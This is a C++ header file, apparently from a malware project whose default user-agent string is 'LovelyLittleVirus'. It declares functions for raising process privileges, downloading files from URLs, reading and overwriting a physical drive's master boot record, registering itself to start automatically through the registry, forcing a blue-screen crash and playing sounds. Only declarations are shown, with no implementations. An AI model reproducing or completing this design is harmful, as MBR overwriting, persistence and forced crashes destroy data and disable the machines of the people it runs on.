#pragma once

#include"std.h"

bool adjustPrivilege(ULONG privilege = 0x13);
std::wstring GetWDataFromURL(const std::wstring& url, bool& isok);
std::string GetDataFromURL(const std::wstring& url, bool& error, const std::wstring& AppName = _T("LovelyLittleVirus"));
bool DownloadFileFromURL(const std::wstring& url, const std::wstring& filepath);
inline bool GetPrivileges() { return adjustPrivilege(); }
bool WritePhydriveMBR(unsigned int id, const std::string& msgstr);
std::string ReadPhydriveMBR(unsigned int id);
bool RegAutoStart();
bool MakeBlueScreen(NTSTATUS errid);
bool PlaySoundFile(const std::wstring& soundname, bool sync);